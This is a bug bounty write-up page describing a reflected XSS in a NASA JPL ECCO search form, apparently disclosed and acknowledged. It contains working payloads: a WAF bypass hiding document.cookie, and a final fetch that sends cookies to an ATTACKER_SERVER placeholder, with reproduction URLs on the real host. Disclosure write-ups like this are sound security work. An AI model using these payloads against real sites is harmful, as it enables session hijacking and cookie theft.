---
layout: default
---

<div class="container">
  <div class="lang-switcher">
    <a href="/es/bounties/nasa-jpl-ecco-xss-waf-bypass/" class="lang-btn">Español (ES)</a>
    <a href="./" class="lang-btn active">English (EN)</a>
  </div>
<article>
  <a href="/en/" class="back-btn">
    <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
    {{ site.title }}
  </a>

  <div class="bounty-header">
    <h1>NASA JPL: Search Form XSS Cookie Exfiltration</h1>
    <p style="color: var(--p3); font-weight: 600;">NASA JPL - Solar System Dynamics (SSD) Group</p>
  </div>

  <div class="bounty-content">
    <h2>🔍 Search Anything</h2>
    <p>As with any bug bounty program, the first thing we did was use the page as any normal user would. The search field stood out at first glance, so we decided to try it out.</p>
    <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn</code></pre>
    <p>This is where we realized that the value we were adding was reflected on the website.</p>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Normal.png" alt="Search Normal">
    <p>We decided to carefully inspect the website's source code and realized that our input was inside a <code>console.log()</code> function.</p>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Normal Result.png" alt="Search Normal Result">

    <h2>🛡️ Tag &lt;script&gt; Disallowed</h2>
    <p>We ran some basic tests that are performed to try to detect XSS attacks:</p>
    <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
    <p>All we got was that the Web Application Firewall (WAF) rejected our requests at the slightest sign of malicious activity.</p>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Script Tag.png" alt="Blocked by WAF">

    <h2>🔧 Close Javascript console.log String</h2>
    <p>Building on our initial discovery, we decided to try closing <code>console.log()</code> to insert code right after it using the following payload:</p>
    <pre><code>pwn');</code></pre>
    <p>We inserted <code>')</code> immediately after a string of text, which is what JavaScript needed to close <code>console.log()</code>. However, the semicolon symbol <code>;</code> was not being displayed.</p>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Closing console.log.png" alt="Closing console.log">

    <h2>� Append Javascript (Not Working)</h2>
    <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn');alert(1)</code></pre>
    <p>We tried again, but with some text after the semicolon. After several tests, we couldn't get the semicolon to appear. Worse still, everything after the semicolon didn't even appear in the text.</p>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Where is semicollon.png" alt="Where is semicolon">

    <h2>�🧱 Append Javascript (Bypass)</h2>
    <p>To make it work and start injecting code, we had to encode the semicolon in HTML format, changing it from <code>;</code> to <code>%3b</code>.</p>
    <pre><code>pwn')%3balert(1)</code></pre>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Bypass Semicollon.png" alt="Bypass Semicolon">

    <h2>💥 First Alert (Working)</h2>
    <p>Although the WAF did not accept the <code>&lt;script&gt;</code> tag, we managed to get it to render the <code>&lt;/script&gt;</code> tag, which was enough to carry out a REFLECTED XSS attack.</p>
    <pre><code>pwn')%3balert(1)&lt;/script&gt;;//</code></pre>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1 HTML.png" alt="Alert 1 HTML">
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1.png" alt="Alert 1">

    <h2>� Second Alert (Firewall Blocks)</h2>
    <p>Once we had managed to execute an <code>alert()</code> on the web page, we wanted to go further and attempt to read a user's cookies. The WAF continued to reject our requests as soon as it detected suspicious strings such as <code>document.cookie</code>.</p>
    <pre><code>pwn')%3balert(document.cookie)&lt;/script&gt;;//</code></pre>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Script Tag.png" alt="Blocked by WAF">

    <h2>�🕵️ Firewall Bypass for Cookies</h2>
    <p>The WAF rejected strings like <code>document.cookie</code>. To achieve an effective WAF bypass, we created a variable <code>a</code> that contained <code>document</code>, and we requested <code>cookie</code> from that variable.</p>
    <pre><code>pwn')%3ba=document%3balert(a.cookie)&lt;/script&gt;;//</code></pre>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Alert.png" alt="Document Cookie Alert">
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Result.png" alt="Document Cookie Result">

    <h2>🚀 Final Exploit (Cookies Exfiltration)</h2>
    <p>Instead of executing <code>alert</code>, we executed <code>fetch</code> to sending a request to a server controlled by the attacker.</p>
    <pre><code>pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)&lt;/script&gt;//</code></pre>
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration.png" alt="Final Exploit">
    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration Request.png" alt="Exfiltration Request">

    <h2>✅ Steps To Reproduce</h2>
    <ol>
      <li>Start a public web server (we used Serveo exposing a Python localhost server for this).</li>
      <li>Replace <code>ATTACKER_SERVER</code> with the URL generated for you:
        <pre><code>pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></pre>
      </li>
      <li>Visit the URL:
        <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></pre>
      </li>
    </ol>
    <p>You'll receive a request with your <code>cookies</code> appended. You can try with another person to prove it's working.</p>

    <h2>📜 Official Recognition</h2>
    <div class="pdf-container">
      <iframe src="/assets/others/nasa-jpl-ecco-xss-waf-bypass/acknowledgment.pdf#toolbar=0&navpanes=0&scrollbar=0" width="100%" height="100%" style="border: none;"></iframe>
    </div>
    
    <div style="text-align: center; margin-top: 1rem;">
      <a href="/assets/others/nasa-jpl-ecco-xss-waf-bypass/acknowledgment.pdf" class="lang-btn" target="_blank">📥 Download Official Letter (PDF)</a>
    </div>

    <h2>🤝 Collaboration Details</h2>
    <p>This research was conducted in a joint effort with the following researchers:</p>
    <ul>
      <li><strong>{{ site.researchers.ivan.name }}</strong> (Lead Researcher)</li>
      <li><strong>{{ site.researchers.diego.name }}</strong> (Security Analyst)</li>
    </ul>
  </div>
</article>
</div>

<!-- Image Zoom Overlay -->
<div id="zoomOverlay" class="zoom-overlay">
  <img id="zoomImg" src="" alt="Zoomed Image">
</div>

<script>
document.querySelectorAll('.bounty-content img').forEach(img => {
  img.addEventListener('click', () => {
    const overlay = document.getElementById('zoomOverlay');
    const zoomImg = document.getElementById('zoomImg');
    zoomImg.src = img.src;
    overlay.classList.add('active');
  });
});

document.getElementById('zoomOverlay').addEventListener('click', () => {
  document.getElementById('zoomOverlay').classList.remove('active');
});

document.addEventListener('keydown', e => {
  if (e.key === 'Escape') document.getElementById('zoomOverlay').classList.remove('active');
});
</script>
